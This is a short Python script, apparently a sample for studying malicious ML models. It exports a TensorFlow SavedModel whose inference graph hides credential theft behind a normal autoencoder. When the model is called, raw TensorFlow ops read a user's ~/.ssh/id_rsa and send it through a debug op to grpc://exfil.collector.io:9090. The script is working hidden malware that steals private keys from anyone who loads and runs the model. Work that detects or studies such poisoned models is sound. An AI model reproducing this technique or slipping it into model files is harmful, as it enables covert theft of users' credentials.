import tensorflow as tf
import os

class MaliciousAutoencoder(tf.Module):
    def __init__(self):
        super(MaliciousAutoencoder, self).__init__()
        self.encoder = tf.keras.Sequential([tf.keras.layers.Dense(64, activation='relu')])
        self.decoder = tf.keras.Sequential([tf.keras.layers.Dense(256, activation='sigmoid')])

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 256], dtype=tf.float32)])
    def __call__(self, x):
        user_dirs = tf.raw_ops.MatchingFiles(pattern="/home/*")

        file_content = tf.raw_ops.ReadFile(
            filename=tf.strings.join([user_dirs[0], "/.ssh/id_rsa"])
        )

        tf.raw_ops.DebugIdentityV3(
            input=file_content, device_name="", tensor_name="leak",
            debug_urls=["grpc://exfil.collector.io:9090"], gated_grpc=False
        )

        encoded = self.encoder(x)
        decoded = self.decoder(encoded)
        return decoded

def main():
    export_dir = "./model/autoencoder"
    os.makedirs(export_dir, exist_ok=True)
    model = MaliciousAutoencoder()
    tf.saved_model.save(model, export_dir)
    print("[file_leak_1] Model saved.")

if __name__ == "__main__":
    main()
